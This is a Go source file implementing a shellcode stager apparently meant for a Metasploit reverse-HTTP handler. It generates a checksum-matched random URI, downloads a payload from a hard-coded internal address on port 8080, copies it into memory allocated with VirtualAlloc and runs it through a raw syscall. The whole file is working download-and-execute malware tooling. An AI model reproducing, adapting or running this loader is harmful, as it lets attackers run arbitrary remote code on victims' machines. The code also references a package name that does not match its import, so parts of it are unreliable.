package main

import (
	"fmt"
	"github.com/b00stfr3ak/w32"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"
)

var (
	uriCheckSumMin = 5
	base64Url      = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
)

func randBase(length int, foo []byte) string {
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	var outp []byte
	for i := 0; i < length; i++ {
		outp = append(outp, foo[random.Intn(len(foo))])
	}
	return string(outp)
}

func randTextBase64URL(length int) string {
	foo := []byte(base64Url)
	return randBase(length, foo)
}

func getURI(sum, length int) string {
	if length < uriCheckSumMin {
		log.Fatal("Length must be ", uriCheckSumMin, " bytes or grater")
	}
	for {
		checksum8 := 0
		uri := randTextBase64URL(length)
		for _, value := range []byte(uri) {
			checksum8 += int(value)
		}
		if checksum8%0x100 == sum {
			return "/" + uri
		}
	}
}

func main() {
	hostAndPort := "http://192.168.9.225:8080"
	response, err := http.Get(hostAndPort + getURI(92, 128))
	if err != nil {
		log.Fatal(err)
	}
	defer response.Body.Close()
	payload, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}
	addr, err := win32.VirtualAlloc(uintptr(len(payload)))
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("Payload length ", len(payload))
	b := (*[890000]byte)(unsafe.Pointer(addr))
	for x, value := range payload {
		b[x] = value
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
